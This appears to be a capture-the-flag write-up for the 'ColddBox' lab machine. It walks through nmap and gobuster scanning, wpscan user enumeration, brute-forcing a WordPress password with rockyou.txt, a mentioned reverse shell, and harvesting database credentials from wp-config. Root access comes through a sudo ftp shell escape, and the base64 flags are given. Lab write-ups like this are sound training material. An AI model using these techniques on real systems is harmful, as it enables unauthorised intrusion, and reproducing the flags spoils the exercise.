> ColddBox

**export IP=10.10.206.215**

# Nmap

sudo nmap -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
4512/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
```

# Gobuster

sudo gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x txt,php,js,html,sql,bak,cgi,zip -o gobuster/initial

```
/index.php (Status: 301)
/wp-content (Status: 301)
/wp-login.php (Status: 200)
/license.txt (Status: 200)
/wp-includes (Status: 301)
/readme.html (Status: 200)
/wp-trackback.php (Status: 200)
/wp-admin (Status: 301)
/hidden (Status: 301) => We got usernames philip, hugo
/hidden (Status: 301)
```

# Enumerating users in wordpress

wpscan --url http://$IP -e u | tee wp_users.txt


```
[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

# Enumerating Plugins

wpscan --url http://$IP -e ap | wp_pliugin

We got a theme in use.

```
[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.206.215/wp-content/themes/twentyfifteen/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://10.10.206.215/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://10.10.206.215/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.206.215/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'
```

We got some username let's bruteforce them using wpscan.

sudo wpscan --url http://$IP --passwords /usr/share/wordlists/rockyou.txt --usernames c0ldd, philip, hugo

```
Username: c0ldd, Password: 9876543210
```

We are in!! Let's get a reverse shell!!

And we are in as www-data. Now we can run linpeas and we got this.

```
[+] Searching Wordpress wp-config.php files
wp-config.php files found:
/var/www/html/wp-config.phpdefine('DB_NAME', 'colddbox');
define('DB_USER', 'c0ldd');
define('DB_PASSWORD', 'cybersecurity');
define('DB_HOST', 'localhost');
``` 

We can either login through ssh or su as c0ldd.

# user.txt

```
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

# Privilege Escalation

sudo -l

```
(root) /usr/bin/vim
(root) /bin/chmod
(root) /usr/bin/ftp 
```

We can use anything and I chose FTP. Looking at GTFO bins we can escalate as root!!

1. sudo ftp
2. !/bin/sh

# root.txt

```
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```